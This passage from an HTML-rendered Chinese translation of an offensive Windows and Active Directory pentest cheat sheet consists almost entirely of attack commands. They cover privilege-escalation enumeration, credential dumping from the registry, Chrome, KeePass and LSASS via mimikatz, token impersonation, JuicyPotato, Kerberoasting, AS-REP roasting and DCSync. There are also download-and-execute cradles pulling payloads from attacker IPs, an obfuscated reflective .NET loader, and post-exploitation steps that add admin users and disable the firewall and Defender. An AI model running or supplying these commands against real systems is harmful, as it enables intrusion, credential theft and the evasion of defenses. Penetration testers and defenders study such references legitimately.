&quot;Everyone&quot;</span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot; </span><br><span class="line">icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul | findstr &quot;(M)&quot; | findstr &quot;BUILTIN\Users&quot;</span><br></pre></td></tr></table></figure><h2 id="4-9-计划任务"><a href="#4-9-计划任务" class="headerlink" title="4.9 计划任务"></a>4.9 计划任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h2 id="4-10-Powershell历史"><a href="#4-10-Powershell历史" class="headerlink" title="4.10 Powershell历史"></a>4.10 Powershell历史</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath</span><br><span class="line">cat (Get-PSReadlineOption).HistorySavePath | sls passw</span><br></pre></td></tr></table></figure><h2 id="4-12-查看已连接的驱动器"><a href="#4-12-查看已连接的驱动器" class="headerlink" title="4.12 查看已连接的驱动器"></a>4.12 查看已连接的驱动器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br><span class="line">wmic logicaldisk get caption,description</span><br><span class="line"></span><br><span class="line">Get-PSDrive | where &#123;$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;&#125;| ft Name,Root</span><br></pre></td></tr></table></figure><h2 id="4-13-查看隐私"><a href="#4-13-查看隐私" class="headerlink" title="4.13 查看隐私"></a>4.13 查看隐私</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">Look for SeImpersonate, SeDebugPrivilege etc</span><br></pre></td></tr></table></figure><h2 id="4-14-还有其他人登录吗？"><a href="#4-14-还有其他人登录吗？" class="headerlink" title="4.14 还有其他人登录吗？"></a>4.14 还有其他人登录吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwinsta</span><br></pre></td></tr></table></figure><h2 id="4-15-查看注册表自动登录"><a href="#4-15-查看注册表自动登录" class="headerlink" title="4.15 查看注册表自动登录"></a>4.15 查看注册表自动登录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><span class="line"></span><br><span class="line">Get-ItemProperty -Path &apos;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&apos; | select &quot;Default*&quot;</span><br></pre></td></tr></table></figure><h2 id="4-16-在凭据管理器中查看存储的凭据"><a href="#4-16-在凭据管理器中查看存储的凭据" class="headerlink" title="4.16 在凭据管理器中查看存储的凭据"></a>4.16 在凭据管理器中查看存储的凭据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br><span class="line">dir C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\</span><br><span class="line">Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\</span><br></pre></td></tr></table></figure><h2 id="4-17-查看未引用的服务路径"><a href="#4-17-查看未引用的服务路径" class="headerlink" title="4.17 查看未引用的服务路径"></a>4.17 查看未引用的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;$_.StartMode -eq &quot;Auto&quot; -and $_.PathName -notlike &quot;C:\Windows*&quot; -and $_.PathName -notlike &apos;&quot;*&apos;&#125; | select PathName,DisplayName,Name</span><br></pre></td></tr></table></figure><h2 id="4-18-查看启动项"><a href="#4-18-查看启动项" class="headerlink" title="4.18 查看启动项"></a>4.18 查看启动项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure><h2 id="4-19-检查AlwaysInstalledElevated注册表项"><a href="#4-19-检查AlwaysInstalledElevated注册表项" class="headerlink" title="4.19 检查AlwaysInstalledElevated注册表项"></a>4.19 检查AlwaysInstalledElevated注册表项</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure><h2 id="4-20-注册表中有密码吗？"><a href="#4-20-注册表中有密码吗？" class="headerlink" title="4.20 注册表中有密码吗？"></a>4.20 注册表中有密码吗？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h2 id="4-21-剩余的任何Sysrep或无人参与文件"><a href="#4-21-剩余的任何Sysrep或无人参与文件" class="headerlink" title="4.21 剩余的任何Sysrep或无人参与文件"></a>4.21 剩余的任何Sysrep或无人参与文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</span><br><span class="line"></span><br><span class="line">Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where &#123;($_.Name -like &quot;*.xml&quot; -or $_.Name -like &quot;*.txt&quot; -or $_.Name -like &quot;*.ini&quot;)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-22-GPP（组策略首选项）密码"><a href="#4-22-GPP（组策略首选项）密码" class="headerlink" title="4.22 GPP（组策略首选项）密码"></a>4.22 GPP（组策略首选项）密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbclient //DOMAINCONTROLLER.local/SYSVOL -U m0chan</span><br><span class="line"></span><br><span class="line">\m0chanAD.local\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\</span><br><span class="line"></span><br><span class="line">http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip - For Decryption</span><br><span class="line"></span><br><span class="line">Can also use PowerUP.ps1</span><br></pre></td></tr></table></figure><h2 id="4-23-转储Chrome密码（也发布漏洞利用程序）"><a href="#4-23-转储Chrome密码（也发布漏洞利用程序）" class="headerlink" title="4.23 转储Chrome密码（也发布漏洞利用程序）"></a>4.23 转储Chrome密码（也发布漏洞利用程序）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#git clone https://github.com/rasta-mouse/CookieMonster</span><br><span class="line"></span><br><span class="line">CookieMonster creds</span><br><span class="line">CookieMonster.exe cookies -d [domain] -e </span><br><span class="line">CookieMonster -a </span><br><span class="line"></span><br><span class="line">Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.</span><br><span class="line"></span><br><span class="line">Can also use Mimikatz for this.</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot; /unprotect</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome /in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; /unprotect</span><br></pre></td></tr></table></figure><h2 id="4-24-转储KeePass"><a href="#4-24-转储KeePass" class="headerlink" title="4.24 转储KeePass"></a>4.24 转储KeePass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/HarmJ0y/KeeThief</span><br><span class="line">#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><span class="line"></span><br><span class="line">Get-Process keepass</span><br><span class="line">tasklist | findstr keepass</span><br><span class="line"></span><br><span class="line">Attacking KeePass</span><br><span class="line"></span><br><span class="line">#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="line">Import-Module KeeThief.ps1</span><br><span class="line">Get-KeePassDatabaseKey -Verbose</span><br><span class="line"></span><br><span class="line">KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.</span><br></pre></td></tr></table></figure><h2 id="4-25-令牌模拟"><a href="#4-25-令牌模拟" class="headerlink" title="4.25 令牌模拟"></a>4.25 令牌模拟</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><span class="line"></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username &quot;lab\domainadminuser&quot;</span><br><span class="line">Get-Process wininit | Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)</span><br><span class="line"></span><br><span class="line">#Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><span class="line"></span><br><span class="line">Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...</span><br><span class="line">$wc=New-Object System.Net.WebClient;$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$k=&quot;xxxxxxx&quot;;$i=0;[byte[]]$b=([byte[]]($wc.DownloadData(&quot;https://xxxxx&quot;)))|%&#123;$_-bxor$k[$i++%$k.length]&#125;</span><br><span class="line">[System.Reflection.Assembly]::Load($b) | Out-Null</span><br><span class="line">$parameters=@(&quot;arg1&quot;, &quot;arg2&quot;)</span><br><span class="line">[namespace.Class]::Main($parameters)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra</span><br></pre></td></tr></table></figure><h2 id="4-26-多汁土豆"><a href="#4-26-多汁土豆" class="headerlink" title="4.26 多汁土豆"></a>4.26 多汁土豆</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><span class="line"></span><br><span class="line">#Reference https://ohpe.it/juicy-potato/</span><br><span class="line"></span><br><span class="line">Requirements: SeAssignPrimaryTokenPrivilege and/or SeImpersonatePrivilege</span><br><span class="line"></span><br><span class="line">(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.14.5:8000/JuicyPotato.exe&apos;,&apos;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&apos;)</span><br><span class="line"></span><br><span class="line">JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c &#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;</span><br><span class="line"></span><br><span class="line">Mochan.exe = Payload</span><br><span class="line">5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD</span><br><span class="line"></span><br><span class="line">A CLSID is a GUID that identifies a COM class object</span><br><span class="line"></span><br><span class="line">Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc</span><br><span class="line"></span><br><span class="line">JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL</span><br></pre></td></tr></table></figure><h2 id="4-27-烧烤"><a href="#4-27-烧烤" class="headerlink" title="4.27 烧烤"></a>4.27 烧烤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#Check my Blog Post Kerberos Attacks in Depth for Further Information</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br><span class="line"></span><br><span class="line">Get-DomainSPNTicket -Credential $cred -OutputFormat hashcat</span><br><span class="line"></span><br><span class="line">because Hashcat over John anyday right?</span><br><span class="line"></span><br><span class="line">Invoke-Kerberoast.ps1</span><br><span class="line"></span><br><span class="line">python GetUserSPNs.py -request -dc-ip 10.10.14.15 m0chanad.local/serviceaccount</span><br><span class="line"></span><br><span class="line">Ofc the above requires access to Port 88 on the DC but you can always port forward if executing GetUserSPNs.py manually.</span><br><span class="line"></span><br><span class="line">https://github.com/GhostPack/SharpRoast --NOW Deprecated-- and incorproated into Rebeus with the kerberoast action</span><br></pre></td></tr></table></figure><h2 id="4-28-用Python编写的"><a href="#4-28-用Python编写的" class="headerlink" title="4.28 用Python编写的"></a>4.28 用Python编写的</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/skelsec/kerberoast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IMPORTANT: the accepted formats are the following</span><br><span class="line">&lt;ldap_connection_string&gt; : &lt;domainname&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line">&lt;kerberos_connection_string&gt;: &lt;kerberos realm&gt;/&lt;username&gt;/&lt;secret_type&gt;:&lt;secret&gt;@&lt;DC_ip&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Look for vulnerable users via LDAP</span><br><span class="line">kerberoast ldap all &lt;ldap_connection_string&gt; -o ldapenum</span><br><span class="line"></span><br><span class="line">Use ASREP roast against users in the ldapenum_asrep_users.txt file</span><br><span class="line">kerberoast asreproast &lt;DC_ip&gt; -t ldapenum_asrep_users.txt</span><br><span class="line"></span><br><span class="line">Use SPN roast against users in the ldapenum_spn_users.txt file</span><br><span class="line">kerberoast spnroast &lt;kerberos_connection_string&gt; -t ldapenum_spn_users.txt</span><br></pre></td></tr></table></figure><h2 id="4-29-代表烘焙"><a href="#4-29-代表烘焙" class="headerlink" title="4.29 代表烘焙"></a>4.29 代表烘焙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#Accounts have to have DONT_REQ_PREAUTH explicitly set for them to be vulnerable</span><br><span class="line"></span><br><span class="line">Get-ASRepHash -Domain m0chanAD.local -User victim</span><br><span class="line"></span><br><span class="line">Can also use Rebeus (Reflectively Load .NET Assembly.)</span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asreproast</span><br></pre></td></tr></table></figure><h2 id="4-30DCSync（也用于后期利用）"><a href="#4-30DCSync（也用于后期利用）" class="headerlink" title="4.30DCSync（也用于后期利用）"></a>4.30DCSync（也用于后期利用）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. </span><br><span class="line"></span><br><span class="line">#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator</span><br><span class="line"></span><br><span class="line">powershell.exe -Version 2 -Exec Bypass /c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.6:8000/Invoke-DCSync.ps1&apos;); Invoke-DCSync -PWDumpFormat&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Empire Module: powershell/credentials/mimikatz/dcsync_hashdump</span><br></pre></td></tr></table></figure><h1 id="0x05-exploit后"><a href="#0x05-exploit后" class="headerlink" title="0x05 exploit后"></a>0x05 exploit后</h1><h2 id="5-1-有用的命令"><a href="#5-1-有用的命令" class="headerlink" title="5.1 有用的命令"></a>5.1 有用的命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net user m0chan /add /domain</span><br><span class="line">net localgroup Administrators m0chan /add</span><br><span class="line"></span><br><span class="line"># Enable RDP</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Turn firewall off</span><br><span class="line">netsh firewall set opmode disable</span><br><span class="line"></span><br><span class="line">Or like this</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">If you get this error:</span><br><span class="line"></span><br><span class="line">CredSSP Error Fix -&gt;</span><br><span class="line"></span><br><span class="line">Add this reg key:</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">Disable Windows Defender</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h2 id="5-2-Esenutl-exe转储锁定文件"><a href="#5-2-Esenutl-exe转储锁定文件" class="headerlink" title="5.2 Esenutl.exe转储锁定文件"></a>5.2 Esenutl.exe转储锁定文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32\esentutl.exe /y &lt;SOURCE&gt; /vss /d &lt;DEST&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)</span><br></pre></td></tr></table></figure><h2 id="5-3-检查是否已启用Powershell日志记录"><a href="#5-3-检查是否已启用Powershell日志记录" class="headerlink" title="5.3 检查是否已启用Powershell日志记录"></a>5.3 检查是否已启用Powershell日志记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription</span><br></pre></td></tr></table></figure><h2 id="5-4-Run-Seatbelt（绝对必须）"><a href="#5-4-Run-Seatbelt（绝对必须）" class="headerlink" title="5.4 Run Seatbelt（绝对必须）"></a>5.4 Run Seatbelt（绝对必须）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/Seatbelt</span><br><span class="line"></span><br><span class="line">This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win</span><br><span class="line"></span><br><span class="line">BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)</span><br><span class="line">RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13</span><br><span class="line">TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)</span><br><span class="line">UACSystemPolicies     -   UAC system policies via the registry</span><br><span class="line">PowerShellSettings    -   PowerShell versions and security settings</span><br><span class="line">AuditSettings         -   Audit settings via the registry</span><br><span class="line">WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry</span><br><span class="line">LSASettings           -   LSA settings (including auth packages)</span><br><span class="line">UserEnvVariables      -   Current user environment variables</span><br><span class="line">SystemEnvVariables    -   Current system environment variables</span><br><span class="line">UserFolders           -   Folders in C:\Users\</span><br><span class="line">NonstandardServices   -   Services with file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">InternetSettings      -   Internet settings including proxy configs</span><br><span class="line">LapsSettings          -   LAPS settings, if installed</span><br><span class="line">LocalGroupMembers     -   Members of local admins, RDP, and DCOM</span><br><span class="line">MappedDrives          -   Mapped drives</span><br><span class="line">RDPSessions           -   Current incoming RDP sessions</span><br><span class="line">WMIMappedDrives       -   Mapped drives via WMI</span><br><span class="line">NetworkShares         -   Network shares</span><br><span class="line">FirewallRules         -   Deny firewall rules, &quot;full&quot; dumps all</span><br><span class="line">AntiVirusWMI          -   Registered antivirus (via WMI)</span><br><span class="line">InterestingProcesses  -   &quot;Interesting&quot; processes- defensive products and admin tools</span><br><span class="line">RegistryAutoRuns      -   Registry autoruns</span><br><span class="line">RegistryAutoLogon     -   Registry autologon information</span><br><span class="line">DNSCache              -   DNS cache entries (via WMI)</span><br><span class="line">ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)</span><br><span class="line">AllTcpConnections     -   Lists current TCP connections and associated processes</span><br><span class="line">AllUdpConnections     -   Lists current UDP connections and associated processes</span><br><span class="line">NonstandardProcesses  -   Running processeswith file info company names that don&apos;t contain &apos;Microsoft&apos;</span><br><span class="line">  *  If the user is in high integrity, the following additional actions are run:</span><br><span class="line">SysmonConfig          -   Sysmon configuration from the registry</span><br><span class="line"></span><br><span class="line">And more!!</span><br></pre></td></tr></table></figure><h2 id="5-5-Dump-Creds"><a href="#5-5-Dump-Creds" class="headerlink" title="5.5 Dump Creds"></a>5.5 Dump Creds</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(new-object System.Net.WebClient).DownloadString(&apos;http://10.10.14.5:8000/Invoke-Mimikatz.ps1&apos;);Invoke-Mimikatz </span><br><span class="line"></span><br><span class="line">Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.</span><br><span class="line"></span><br><span class="line">mimikatz.exe</span><br><span class="line">privlege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">The safer method is to dump the process memory of LSASS.exe with MiniDump </span><br><span class="line">(https://github.com/3xpl01tc0d3r/Minidump)</span><br><span class="line"></span><br><span class="line">(or) https://github.com/GhostPack/SharpDump</span><br><span class="line"></span><br><span class="line">and send the .bin to Mimikatz locally.</span><br><span class="line"></span><br><span class="line">sekurlsa::minidump C:\users\m0chan\lssas.dmp</span><br><span class="line"></span><br><span class="line">Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.</span><br><span class="line"></span><br><span 